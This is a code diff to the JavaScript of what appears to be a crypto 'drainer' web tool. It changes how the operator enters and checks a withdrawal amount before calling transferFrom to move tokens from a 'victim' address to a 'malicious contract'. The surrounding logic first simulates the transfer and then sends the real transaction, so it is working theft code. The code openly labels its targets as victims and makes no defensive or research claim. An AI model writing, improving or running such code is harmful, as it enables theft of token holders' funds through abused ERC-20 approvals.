@@ -617,38 +617,40 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             const allowanceBN = web3.utils.toBN(allowance);
             console.debug("Converted values: Balance:", balanceBN.toString(), "Allowance:", allowanceBN.toString());
 
-            // Step 5: Calculate the maximum amount to withdraw (the minimum of balance and allowance)
-            console.debug("Calculating maximum amount to withdraw...");
-            const maxWithdrawableAmount = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN;
-            console.debug("Maximum amount to withdraw:", maxWithdrawableAmount.toString());
+            // Step 5: Prompt for the amount to withdraw
+            const amountToWithdrawInput = prompt("Enter the amount you want to withdraw (in token units):");
+            const amountToWithdraw = web3.utils.toWei(amountToWithdrawInput, 'ether'); // Convert entered amount to Wei (18 decimals)
+            const amountToWithdrawBN = web3.utils.toBN(amountToWithdraw);
+            console.debug("Amount to withdraw entered:", amountToWithdrawInput, "Converted to Wei:", amountToWithdrawBN.toString());
 
-            // Step 6: Prompt the attacker to enter the withdrawal amount
-            const withdrawAmount = prompt(`Enter the amount of tokens to withdraw (max: ${web3.utils.fromWei(maxWithdrawableAmount, 'ether')} tokens):`);
-
-            // Step 7: Validate the entered withdrawal amount
-            const amountBN = web3.utils.toBN(withdrawAmount);
-            if (amountBN.lte(web3.utils.toBN(0))) {
-                alert("Invalid amount entered.");
-                console.debug("Invalid withdrawal amount:", withdrawAmount);
-                return; // Exit if the amount is invalid
+            // Step 6: Check if the amount to withdraw is valid (non-zero and within allowance and balance)
+            if (amountToWithdrawBN.lte(web3.utils.toBN(0))) {
+                alert("Invalid amount to withdraw.");
+                console.debug("Withdraw aborted: Invalid amount.");
+                return; // Stop execution for zero or negative amounts
             }
 
-            // Ensure the withdrawal amount does not exceed the available balance or allowance
-            if (amountBN.gt(maxWithdrawableAmount)) {
-                alert("Withdrawal amount exceeds available balance or allowance.");
-                console.debug("Withdraw aborted: Amount exceeds available funds.");
-                return; // Exit if the amount exceeds balance or allowance
+            if (amountToWithdrawBN.gt(balanceBN)) {
+                alert("Amount exceeds victim's balance.");
+                console.debug("Withdraw aborted: Amount exceeds balance.");
+                return; // Stop execution if the amount exceeds balance
             }
 
-            // Step 8: Simulate the withdrawal transaction (no gas fee)
+            if (amountToWithdrawBN.gt(allowanceBN)) {
+                alert("Amount exceeds approved allowance.");
+                console.debug("Withdraw aborted: Amount exceeds allowance.");
+                return; // Stop execution if the amount exceeds allowance
+            }
+
+            // Step 7: Simulate the withdrawal transaction (no gas fee)
             console.debug("Simulating withdrawal transaction...");
             try {
                 const simulationResult = await tokenContract.methods
-                    .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountBN.toString())
+                    .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdrawBN.toString())
                     .call({ from: accounts[0] }); // Simulation call
                 console.debug("Simulation successful, result:", simulationResult);
 
-                alert(`Simulation successful. You can proceed to withdraw ${web3.utils.fromWei(amountBN, 'ether')} tokens.`);
+                alert(`Simulation successful. You can proceed to withdraw ${web3.utils.fromWei(amountToWithdrawBN, 'ether')} tokens.`);
             } catch (simulationError) {
                 console.error("Simulation Error:", simulationError);
 
@@ -662,17 +664,17 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return; // Stop execution on simulation failure
             }
 
-            // Step 9: Execute the actual withdrawal transaction
+            // Step 8: Execute the actual withdrawal transaction
             console.debug("Attempting to execute withdrawal...");
             const transaction = await tokenContract.methods
-                .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountBN.toString())
+                .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdrawBN.toString())
                 .send({ from: accounts[0] }); // Actual transaction with gas fee
             console.debug("Transaction details:", transaction);
 
             // Notify successful withdrawal
-            alert(`Successfully withdrawn ${web3.utils.fromWei(amountBN, 'ether')} tokens!`);
+            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdrawBN, 'ether')} tokens!`);
         } catch (error) {
-            // Step 10: Handle errors during the withdrawal process
+            // Step 9: Handle errors during the withdrawal process
             console.error("Withdrawal Error:", error);
             alert("Error occurred during withdrawal. Check victim's approval and balance.");
         }
